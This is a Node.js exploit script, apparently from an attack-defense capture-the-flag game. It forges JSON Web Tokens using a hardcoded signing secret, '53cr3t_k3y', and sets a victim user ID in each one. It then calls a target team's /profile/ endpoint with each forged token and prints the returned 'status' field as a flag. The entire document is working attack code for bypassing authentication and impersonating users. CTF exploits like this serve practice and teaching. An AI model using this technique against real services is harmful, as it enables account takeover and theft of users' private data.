var jwt = require('jsonwebtoken');
var fetch = require('node-fetch');


async function exploit(ip, port, flag_ids) {
    const baseurl = `http://${ip}:${port}`
    for (const userId of flag_ids) {
        const token = jwt.sign({user: {userId, username: 'user', displayname: 'user'}}, '53cr3t_k3y');
        const url = `${baseurl}/profile/`
        try {
            const response = await fetch(url, {
                headers: {
                    Authorization: `Bearer ${token}`
                }
            });

            const profile = await response.json();
            console.log(`FLAG for user id '${userId}': '${profile.status}'`);
        } catch (e) {
            console.error(`Error when fetching profile data for user id '${userId}':\n\t${e}`);
        }
    }
}

const args = process.argv;

if (args.length < 5) {
    console.error("Usage: node exploit.js <TEAM_IP> <PORT> <FLAG_ID_1> [<FLAG_ID_2>] ...")
    process.exit(-1);
}

const ip = args[2];
const port = args[3]
const flag_ids = args.slice(4)

exploit(ip, port, flag_ids);